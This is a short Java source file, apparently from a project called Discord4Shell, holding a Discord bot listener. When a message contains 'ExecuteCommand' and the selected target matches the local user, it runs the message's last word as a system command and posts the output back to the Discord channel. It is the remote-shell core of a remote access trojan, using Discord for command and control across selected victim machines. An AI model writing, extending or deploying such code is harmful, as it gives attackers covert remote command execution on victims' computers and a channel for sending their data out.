package org.example.commands;

import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;

import java.io.IOException;
import java.io.InputStreamReader;
import java.util.Objects;

import static org.example.Discord4Shell.Discord4Shell.user;
import static org.example.commands.SelectTargetMessage.SelectedTarget;
import java.io.BufferedReader;

public class ExecuteCommandMessage extends ListenerAdapter {

    public static String Message = null;
    public void onMessageReceived(MessageReceivedEvent event) {
        if (event.getAuthor().isBot()) {
            return;
        }

        if (event.getMessage().getContentRaw().contains("ExecuteCommand")) {
            String[] args = event.getMessage().getContentRaw().split(" ");
            for(int i = 0; i < args.length; i++)
                Message = args[i];
            if (Objects.equals(SelectedTarget, user)) {
                try {
                    Process process = Runtime.getRuntime().exec(Message);
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    String line;
                    while ((line = reader.readLine()) != null) {
                        event.getChannel().sendMessage(line).queue();
                    }
                    reader.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }
}
